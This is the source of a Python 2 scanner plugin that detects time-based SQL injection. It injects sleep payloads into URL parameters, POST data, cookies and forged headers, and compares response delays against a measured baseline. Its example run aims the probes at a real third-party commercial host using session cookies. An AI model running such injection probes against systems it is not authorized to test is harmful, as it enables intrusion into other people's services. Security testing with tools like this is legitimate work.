#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from lib.common import *
from config import *
# import Pollution
from math import sqrt
import urlparse
import re
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

TIMESLEEP = 6
TIMEOUT = 20

def check(url, method, data, headers):
    return True

def get_payloads():
    payloads = sqli_time_payloads()
    return payloads

def stdev(values):
    if not values or len(values) < 2:
        return None
    key = (values[0], values[-1], len(values))
    avg = average(values)
    _ = reduce(lambda x, y: x + pow((y or 0) - avg, 2), values, 0.0)
    retVal = sqrt(_ / (len(values) - 1))
    return retVal

def average(values):
    return (sum(values) / len(values)) if values else None

def get_sleep_time(url, headers, responseTimes=None):
    if responseTimes == None:
        responseTimes = []
    count = 0
    while len(responseTimes) < 30:
        code, head, html, time = http_request_get(url, headers=headers, timeout=TIMEOUT, time_check=True)
        if code != -1:
            responseTimes.append(time)
        else:
            count = count + 1
        if count > 10:
            return 0
    time = average(responseTimes) + stdev(responseTimes)*7
    #print time
    return time

def cookie_payload(cookie, payload):
    cookies = []
    filters = []
    cookie = cookie.replace('&','%26')
    for line in cookie.split(';'):
        line = line.split('=')
        if len(line) == 2:
            key = line[0].strip()
            value = line[1].strip()
            _ = key + '=' + value
            if cookie_filter(key):
                cookies.append(_)
            else:
                filters.append(_)
    cookie = '&'.join(cookies)
    # datas = Pollution([payload]).payload_generator(cookie, append=True)
    datas = Pollution(cookie, [payload,], replace=False).payload_generate()
    datas = [urllib.urlencode(data) for data in datas]
    results = []
    for data in datas:
        _ = data.split('&')
        _.extend(filters)
        _ = ';'.join(_)
        results.append(_)
    return results

def run(url, method, data, headers, proxy_headers=None, responseTimes=None):
    try:
        VUL = False
        # host = urlparse.urlparse(url).netloc
        parsed_url = urlparse.urlparse(url)
        host = parsed_url.netloc
        query = parsed_url.query


        url = url.encode('utf-8')
        data = data.encode('utf-8') if data is not None else ''
        headers = get_headers(url, method, data, headers, proxy_headers)
        payloads = get_payloads()
        SLEEP_TIME = get_sleep_time(url, headers, responseTimes)
        if SLEEP_TIME == 0:
            return
        headers_fuzz = {'Host':host,
                        'Referer':headers.get('Referer',''),
                        'User-Agent':headers.get('User-Agent',''),
                        'X-Forwarded-Host':'localhost',
                        'X-Forwarded-For':'127.0.0.1',
                        'X-Real-IP':'127.0.0.1',
                        'Client-IP':'127.0.0.1',
                       }
        #====================================================================================
        if method == 'GET':
            for payload in payloads:
                payload = payload.replace('TIMESLEEP', str(int(SLEEP_TIME) + TIMESLEEP))
        #====================================================================================
                # urls = Pollution([payload]).payload_generator(url, append=True)
                query_dicts = Pollution(query, [payload,], replace=False).payload_generate()
                urls = []
                for d in query_dicts:
                    u = urlparse.urlunparse((parsed_url.scheme, parsed_url.netloc,parsed_url.path,'',urllib.urlencode(d), parsed_url.fragment))
                    urls.append(u)

                #print urls
                for index in range(len(urls)):
                    code, head, html, time = http_request_get(urls[index], headers=headers, timeout=TIMEOUT, time_check=True)
                    #print '----------------------------'
                    #print code, time
                    if time > int(SLEEP_TIME) + TIMESLEEP:
                        code, head, html, time = http_request_get(urls[index], headers=headers, timeout=TIMEOUT, time_check=True)
                        if time > int(SLEEP_TIME) + TIMESLEEP:
                            VUL = urls[index] + '\n\n' + str(time) + '>' + str(TIMESLEEP)
                            break
                if VUL:
                    return {'target':host, 'type':'Sqli Time Injection', 'info':VUL}
        #====================================================================================
                cookies = headers.get('Cookie','')
                cookies = cookie_payload(cookies, payload)
                for index in range(len(cookies)):
                    tmp_headers = dict(headers)
                    tmp_headers['Cookie'] = cookies[index]
                    code, head, html, time = http_request_get(url, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                    if time > int(SLEEP_TIME) + TIMESLEEP:
                        code, head, html, time = http_request_get(url, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                        if time > int(SLEEP_TIME) + TIMESLEEP:
                            VUL = '{0}\n\n{1}: {2}'.format(url, 'Cookie', tmp_headers['Cookie']) + '\n\n' + str(time) + '>' + str(TIMESLEEP)
                            break
                if VUL:
                    return {'target':host, 'type':'Sqli Time Injection', 'info':VUL}
        #====================================================================================
                for h in headers_fuzz:
                    tmp_headers = dict(headers)
                    tmp_headers[h] = headers_fuzz[h] + payload
                    code, head, html, time = http_request_get(url, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                    #if time > TIMESLEEP:
                    if time > int(SLEEP_TIME) + TIMESLEEP:
                        code, head, html, time = http_request_get(url, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                        #if time > TIMESLEEP:
                        if time > int(SLEEP_TIME) + TIMESLEEP:
                            VUL = '{0}\n\n{1}: {2}'.format(url, h, tmp_headers[h]) + '\n\n' + str(time) + '>' + str(TIMESLEEP)
                            break
                if VUL:
                    return {'target':host, 'type':'Sqli Time Injection', 'info':VUL}
        #====================================================================================
        else:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                payload = payload.replace('TIMESLEEP', str(int(SLEEP_TIME) + TIMESLEEP))
        #====================================================================================
                # urls = Pollution([payload]).payload_generator(url, append=True)
                query_dicts = Pollution(query, [payload,], replace=False).payload_generate()
                urls = []
                for d in query_dicts:
                    u = urlparse.urlunparse((parsed_url.scheme, parsed_url.netloc,parsed_url.path,'',urllib.urlencode(d), parsed_url.fragment))
                    urls.append(u)

                for index in range(len(urls)):
                    code, head, html, time = http_request_post(urls[index], data, headers=headers, timeout=TIMEOUT, time_check=True)
                    #if time > TIMESLEEP:
                    if time > int(SLEEP_TIME) + TIMESLEEP:
                        code, head, html, time = http_request_post(urls[index], data, headers=headers, timeout=TIMEOUT, time_check=True)
                        #if time > TIMESLEEP:
                        if time > int(SLEEP_TIME) + TIMESLEEP:
                            VUL = urls[index] + '\n\n' + data + '\n\n' + str(time) + '>' + str(TIMESLEEP)
                            break
                if not VUL:
                    # datas = Pollution([payload]).payload_generator(data, append=True)
                    datas = Pollution(query, [payload,],replace=False).payload_generate()
                    for index in range(len(datas)):
                        code, head, html, time = http_request_post(url, datas[index], headers=headers, timeout=TIMEOUT, time_check=True)
                        #if time > TIMESLEEP:
                        if time > int(SLEEP_TIME) + TIMESLEEP:
                            code, head, html, time = http_request_post(url, datas[index], headers=headers, timeout=TIMEOUT, time_check=True)
                            #if time > TIMESLEEP:
                            if time > int(SLEEP_TIME) + TIMESLEEP:
                                VUL = url + '\n\n' + datas[index] + '\n\n' + str(time) + '>' + str(TIMESLEEP)
                                break
                if VUL:
                    return {'target':host, 'type':'Sqli Time Injection', 'info':VUL}
        #====================================================================================
                cookies = headers.get('Cookie','')
                cookies = cookie_payload(cookies, payload)
                for index in range(len(cookies)):
                    tmp_headers = dict(headers)
                    tmp_headers['Cookie'] = cookies[index]
                    code, head, html, time = http_request_post(url, data, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                    #if time > TIMESLEEP:
                    if time > int(SLEEP_TIME) + TIMESLEEP:
                        code, head, html, time = http_request_post(url, data, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                        #if time > TIMESLEEP:
                        if time > int(SLEEP_TIME) + TIMESLEEP:
                            VUL = '{0}\n\n{1}\n\n{2}: {3}'.format(url, data, 'Cookie', tmp_headers['Cookie']) + '\n\n' + str(time) + '>' + str(TIMESLEEP)
                            break
                if VUL:
                    return {'target':host, 'type':'Sqli Time Injection', 'info':VUL}
        #====================================================================================
                for h in headers_fuzz:
                    tmp_headers = dict(headers)
                    tmp_headers[h] = headers_fuzz[h] + payload
                    code, head, html, time = http_request_post(url, data, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                    #if time > TIMESLEEP:
                    if time > int(SLEEP_TIME) + TIMESLEEP:
                        code, head, html, time = http_request_post(url, data, headers=tmp_headers, timeout=TIMEOUT, time_check=True)
                        #if time > TIMESLEEP:
                        if time > int(SLEEP_TIME) + TIMESLEEP:
                            VUL = '{0}\n\n{1}\n\n{2}: {3}'.format(url, data, h, tmp_headers[h]) + '\n\n' + str(time) + '>' + str(TIMESLEEP)
                            break
                if VUL:
                    return {'target':host, 'type':'Sqli Time Injection', 'info':VUL}
        #====================================================================================
    except Exception, e:
        print repr(e)
        pass
#print run('http://testphp.vulnweb.com/artists.php?artist=1','GET','',{'cookie':''})
#print run('http://127.0.0.1/sqli.php?id=1','GET','',{'cookie':''})
def verify(task):
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "sqli-times",
        "info" : "[sqli times]",
    }
    url = task['url']
    method = task['method']
    headers = task['request_header']
    data = task['request_content'] if method == 'POST' else None


    result = run(url, method, data, headers)
    if result:
        message['method'] = method
        message['url'] = url
        message['param'] = result['info']
        save_to_databases(message)
        result = (True, message)
    else:
        result = (False, {})
    return result


if __name__ == '__main__':
    task = {
        'url': 'http://i.jd.com/commons/img/no-img_mid_.jpg',
        'request_header': {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://127.0.0.1:8000/vulnerabilities/exec/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'sessions=%7B%7D; csrftoken=71w812VAMB8nvVNcYgOmwW6ftN8igDyZsqE9FHz2MsGdQpgdmwpl1jzG2iE7YwLZ; sessionid=x4phtuh6qv5zhpcu46v1xlszto8pbib1; PHPSESSID=ktd1uec9ekucj6afr284i5bks6; security=low; hibext_instdsigdipv2=1; GUID=LgyzlhQfEaDsb0uiyhiN',
        },
        'request_content': '',
        'method': 'GET'
    }
    print verify(task)
